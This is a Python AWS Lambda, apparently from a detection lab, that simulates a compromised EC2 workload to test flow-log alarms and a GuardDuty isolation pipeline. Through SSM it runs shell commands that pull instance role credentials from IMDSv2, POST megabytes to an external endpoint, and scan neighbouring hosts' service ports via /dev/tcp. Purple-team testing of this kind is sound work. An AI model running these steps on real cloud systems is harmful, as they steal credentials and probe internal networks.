"""Simulated compromised-workload attacker (network plane).

Unlike scenario 1 (where the attack is API calls the Lambda makes directly),
the network-plane signatures only exist if traffic actually crosses the
instance's ENI. So this Lambda plays the operator OFF the box: it drives a shell
script ON the box via ssm:SendCommand. That script:

  1. Reads the instance role's credentials from IMDSv2 (the "theft").
  2. Generates a burst of EGRESS bytes - a few MB POSTed to an external endpoint
     (the exfiltration the egress metric-filter alarm watches for).
  3. Fans out east-west connection attempts to neighbouring subnet addresses on
     closed ports (the lateral-movement probe - REJECT records in the flow logs).

The Lambda execution role is used for ONE demo-only thing beyond SSM: firing a
GuardDuty sample finding (InstanceCredentialExfiltration.OutsideAWS) so the
detect->respond pipeline is testable without waiting days for a real finding.
"""

import os
import time

import boto3
from botocore.exceptions import ClientError

REGION = os.environ.get("AWS_REGION", "us-east-1")


def wait_until_managed(ssm, instance_id, attempts=20, delay=15):
    """Poll until the instance is an Online SSM-managed instance.

    AL2023 ships the SSM agent, but registration lags boot by 1-3 min. Until the
    instance shows up here, ssm:SendCommand fails with InvalidInstanceId. This is
    the network-plane analogue of scenario 1's wait_until_live key-propagation gate.
    """
    for i in range(attempts):
        info = ssm.describe_instance_information(
            Filters=[{"Key": "InstanceIds", "Values": [instance_id]}]
        ).get("InstanceInformationList", [])
        if info and info[0].get("PingStatus") == "Online":
            print(f"[+] instance {instance_id} is SSM-managed (Online)")
            return True
        print(f"[.] attempt {i + 1}: {instance_id} not SSM-managed yet; sleeping {delay}s")
        time.sleep(delay)
    raise RuntimeError(f"instance {instance_id} never became SSM-managed")


def attack_script(endpoint, subnet_prefix, payload_mb, chunks):
    """The shell the attacker runs on the box. Kept POSIX-simple (no python on
    the instance assumed) and idempotent enough to re-fire."""
    return [
        "set -u",
        "echo '== simulated workload compromise =='",
        # --- 1) steal the instance role creds from IMDSv2 (the theft) ---
        'TOKEN=$(curl -sf -X PUT "http://169.254.169.254/latest/api/token" '
        '-H "X-aws-ec2-metadata-token-ttl-seconds: 300")',
        'ROLE=$(curl -sf -H "X-aws-ec2-metadata-token: $TOKEN" '
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/)",
        'CREDS=$(curl -sf -H "X-aws-ec2-metadata-token: $TOKEN" '
        '"http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE")',
        'AKID=$(echo "$CREDS" | grep -o \'"AccessKeyId" : "[^"]*\' | cut -d\'"\' -f4)',
        'echo "[+] stole instance role creds for $ROLE (AccessKeyId ${AKID%??????????????????}...)"',
        # --- 2) exfil: push several MB of egress to an external endpoint ---
        f"dd if=/dev/urandom of=/tmp/.loot bs=1M count={payload_mb} 2>/dev/null",
        f'echo "[+] exfiltrating to {endpoint} in {chunks} chunks"',
        f"for i in $(seq 1 {chunks}); do "
        f'curl -s -o /dev/null --max-time 30 -X POST --data-binary @/tmp/.loot "{endpoint}" '
        '|| echo "[.] chunk $i post ended (bytes still egressed)"; done',
        "rm -f /tmp/.loot",
        # --- 3) lateral-movement probe: knock on neighbours' closed ports ---
        # bash /dev/tcp connects that get refused/dropped -> REJECT flow records.
        'echo "[+] probing east-west neighbours (expect REJECTs)"',
        f'for host in {subnet_prefix}.10 {subnet_prefix}.11 {subnet_prefix}.12 '
        f"{subnet_prefix}.20 {subnet_prefix}.21; do "
        "for port in 22 445 3389 5432 6379; do "
        'timeout 1 bash -c "echo > /dev/tcp/$host/$port" 2>/dev/null '
        '&& echo "  open $host:$port" || true; done; done',
        'echo "== done =="',
    ]


def run_on_box(ssm, instance_id):
    commands = attack_script(
        endpoint=os.environ["EXFIL_ENDPOINT"],
        subnet_prefix=os.environ.get("SUBNET_PREFIX", "10.20.1"),
        payload_mb=int(os.environ.get("PAYLOAD_MB", "2")),
        chunks=int(os.environ.get("EXFIL_CHUNKS", "10")),
    )
    sent = ssm.send_command(
        InstanceIds=[instance_id],
        DocumentName="AWS-RunShellScript",
        Comment="atkplane scenario-02 simulated compromise",
        Parameters={"commands": commands},
        TimeoutSeconds=600,
    )
    command_id = sent["Command"]["CommandId"]
    print(f"[+] ssm:SendCommand {command_id} -> {instance_id}")

    # Best-effort: wait briefly for completion so the invocation surfaces errors.
    for _ in range(20):
        time.sleep(6)
        try:
            inv = ssm.get_command_invocation(CommandId=command_id, InstanceId=instance_id)
        except ClientError as exc:
            if exc.response["Error"]["Code"] == "InvocationDoesNotExist":
                continue
            raise
        status = inv["Status"]
        if status in ("Success", "Failed", "Cancelled", "TimedOut"):
            print(f"[i] command {status}")
            if inv.get("StandardOutputContent"):
                print(inv["StandardOutputContent"])
            if status != "Success" and inv.get("StandardErrorContent"):
                print(f"[-] stderr: {inv['StandardErrorContent']}")
            return command_id, status
    print("[i] command still running; returning without waiting further")
    return command_id, "InProgress"


def handler(event, context):
    instance_id = os.environ["INSTANCE_ID"]
    ssm = boto3.client("ssm", region_name=REGION)

    wait_until_managed(ssm, instance_id)
    command_id, status = run_on_box(ssm, instance_id)

    # Demo helper (NOT the attacker): fire a GuardDuty sample finding via the
    # execution role so the EventBridge -> isolation pipeline is exercised
    # deterministically. Real EC2 credential-exfil findings need days of baseline.
    detector = os.environ.get("DETECTOR_ID", "")
    if detector:
        try:
            boto3.client("guardduty", region_name=REGION).create_sample_findings(
                DetectorId=detector,
                FindingTypes=["UnauthorizedAccess:EC2/InstanceCredentialExfiltration.OutsideAWS"],
            )
            print("[+] guardduty sample finding generated")
        except ClientError as exc:
            print(f"[-] create_sample_findings failed ({exc.response['Error']['Code']})")

    return {
        "status": "attack dispatched",
        "instance_id": instance_id,
        "command_id": command_id,
        "command_status": status,
    }
